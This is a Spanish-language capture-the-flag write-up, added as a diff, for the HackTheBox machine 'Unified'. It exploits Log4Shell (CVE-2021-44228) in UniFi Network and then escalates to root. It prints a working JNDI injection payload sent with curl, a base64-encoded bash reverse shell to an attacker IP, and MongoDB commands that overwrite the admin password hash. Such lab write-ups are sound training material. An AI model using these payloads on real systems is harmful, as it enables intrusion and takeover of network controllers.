@@ -1,0 +1,308 @@
+---
+type: writeup
+title: Unified
+description: Demuestra la explotación de la vulnerabilidad Log4Shell (CVE-2021-44228) en la aplicación UniFi Network. La enumeración revela una instancia vulnerable de UniFi donde se puede lograr una ejecución remota mediante la creación e inyección de una carga útil JNDI en una solicitud POST. Posteriormente, se puede aprovechar una base de datos MongoDB local para restablecer la contraseña de administrador y obtener acceso al panel de administración de UniFi. Se pueden descubrir credenciales SSH en texto plano en la configuración de la aplicación, lo que permite la escalada final de privilegios.
+lang: es
+draft: false
+image: ../../../../images/writeups/hackthebox/machines/unified/unified.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/Unified
+difficulty: veryeasy
+os: linux
+hints: []
+tags: []
+---
+
+## Enumeration
+
+Escaneamos con `nmap` todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.96.149
+```
+
+```plaintext
+PORT     STATE SERVICE       REASON
+22/tcp   open  ssh           syn-ack ttl 63
+6789/tcp open  ibm-db2-admin syn-ack ttl 63
+8080/tcp open  http-proxy    syn-ack ttl 63
+8443/tcp open  https-alt     syn-ack ttl 63
+8843/tcp open  unknown       syn-ack ttl 63
+8880/tcp open  cddbp-alt     syn-ack ttl 63
+```
+
+Escaneamos los puertos abiertos para conocer más detalles de los servicios.
+
+```bash
+nmap -p 22,6789,8080,8443,8843,8880 -sCV -oA nmap/openports 10.129.96.149
+```
+
+```plaintext
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+6789/tcp open  ibm-db2-admin?
+8080/tcp open  http            Apache Tomcat (language: en)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
+8443/tcp open  ssl/nagios-nsca Nagios NSCA
+|_ssl-date: TLS randomness does not represent time
+| http-title: Site doesn't have a title (text/plain;charset=UTF-8).
+|_Requested resource was /manage/account/login?redirect=%2Fmanage
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+8843/tcp open  ssl/http        Apache Tomcat (language: en)
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
+|_ssl-date: TLS randomness does not represent time
+8880/tcp open  http            Apache Tomcat (language: en)
+|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## Exploitation
+
+El servicio `http` aloja un sitio web UniFi que es un sistema de gestión de redes profesionales creado por la empresa Ubiquiti que permite controlar internet, Wi-Fi, cámaras y seguridad desde un solo lugar. La versión 6.4.54 es vulnerable y permite ejecución remota de comandos ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)).
+
+Tuve que hacer todo el siguiente lío para que todo funcione.
+
+Instalar `JDK 8`.
+
+```bash
+sudo pacman -S jdk8-openjdk
+```
+
+Instalar `Maven`.
+
+```bash
+sudo pacman -S maven
+```
+
+Activar `Java 8`.
+
+```bash
+sudo archlinux-java set java-8-openjdk
+```
+
+Compilar `marshalsec`.
+
+```bash
+git clone https://github.com/veracode-research/rogue-jndi
+```
+
+```bash
+cd rogue-jndi
+```
+
+```bash
+mvn package -DskipTests
+```
+
+```bash
+echo -n 'bash -i >& /dev/tcp/10.10.15.41/1111 0>&1' | base64
+```
+
+```plaintext
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40MS8xMTExIDA+JjE=
+```
+
+```bash
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40MS8xMTExIDA+JjE=}|{base64,-d}|bash" --hostname "10.10.15.41"
+```
+
+Nos ponemos en escucha.
+
+```bash
+nc -lnvp 1111
+```
+
+Mandamos el payload.
+
+```bash
+curl -sk "https://10.129.96.149:8443/api/login" -H "Content-Type: application/json; charset=utf-8" -d '{"username":"a","password":"a","remember":"${jndi:ldap://10.10.15.41:1389/o=tomcat}","strict":true}'
+```
+
+Recibimos la shell y la estabilizamos.
+
+```bash
+script /dev/null -c bash
+```
+
+Presionamos `ctrl` + `z`.
+
+```bash
+stty raw -echo; fg
+```
+
+```bash
+reset xterm
+```
+
+```bash
+export TERM=xterm
+```
+
+```bash
+export SHELL=bash
+```
+
+```bash
+stty rows 38 columns 171
+```
+
+A por la flag del user.
+
+Listamos el contenido del directorio `/home`.
+
+```bash
+ls -R /home
+```
+
+```plaintext
+/home:
+michael
+
+/home/michael:
+user.txt
+```
+
+```bash
+cat /home/michael/user.txt 
+```
+
+### User flag
+
+<Callout type="success" title="User flag">
+6******************************7
+</Callout>
+
+## Privilege Escalation
+
+Listamos los procesos.
+
+```bash
+ps aux
+```
+
+```plaintext
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+<SNIP>
+unifi         67  0.3  4.2 1102720 85780 ?       Sl   Jul30   0:44 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotat
+<SNIP>
+```
+
+Hay una base de datos `MongoDB`. Nos conectamos.
+
+```bash
+mongo 127.0.0.1:27117
+```
+
+Listamos las bases de datos.
+
+```bash
+show dbs
+```
+
+```plaintext
+ace       0.002GB
+ace_stat  0.000GB
+admin     0.000GB
+config    0.000GB
+local     0.000GB
+```
+
+Cambiamos a la base de datos `ace`.
+
+```bash
+use ace
+```
+
+Ver las colecciones que tiene la base de datos `ace`.
+
+```bash
+show collections
+```
+
+```plaintext
+account
+admin
+alarm
+alert
+<SNIP>
+```
+
+Listamos las cuentas que tienen acceso de administración.
+
+```bash
+db.admin.find().pretty()
+```
+
+```json
+{
+	"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+	"name" : "administrator",
+	"email" : "administrator@unified.htb",
+	"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+	"time_created" : NumberLong(1640900495),
+	"last_site_name" : "default",
+    <SNIP>
+}
+```
+
+Copiamos el hash y usamos hashcat para identificar el tipo de hash.
+
+```bash
+echo '$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.' > administrator.hash
+```
+
+```bash
+hashcat --identify administrator.hash
+```
+
+```plaintext
+The following hash-mode match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+   1800 | sha512crypt $6$, SHA512 (Unix)                             | Operating System
+```
+
+Creamos un hash `sha512`.
+
+```bash
+openssl passwd -6 -salt melvin melvin
+```
+
+```plaintext
+$6$melvin$M7n2B4QpTsSHRIzfkYME72h2w8QWKSYTXQ48jdX3nNAd138OxRCDjDDCJ.QrZP.UV139HUjYyVWKYrJYIrqf00
+```
+
+Actualizar la propiedad x_shadow del administrator.
+
+```bash
+db.admin.updateOne({ _id: ObjectId("61ce278f46e0fb0012d47ee4") }, { $set: { x_shadow: "$6$melvin$M7n2B4QpTsSHRIzfkYME72h2w8QWKSYTXQ48jdX3nNAd138OxRCDjDDCJ.QrZP.UV139HUjYyVWKYrJYIrqf00" } })
+```
+
+```json
+{ "acknowledged" : true, "matchedCount" : 1, "modifiedCount" : 1 }
+```
+
+Iniciamos sesión en el sitio web de `UniFi` con la contraseña que modificamos. En las `settings` encontramos la contraseña del usuario `root`.
+
+![Webservice Administrator Settings](@images/writeups/hackthebox/machines/unified/webservice-administrator-settings.png)
+
+Nos conectamos por ssh con las credenciales del usuario root y leemos el contenido de la flag.
+
+### Root flag
+
+<Callout type="success" title="Root flag">
+e******************************1
+</Callout>
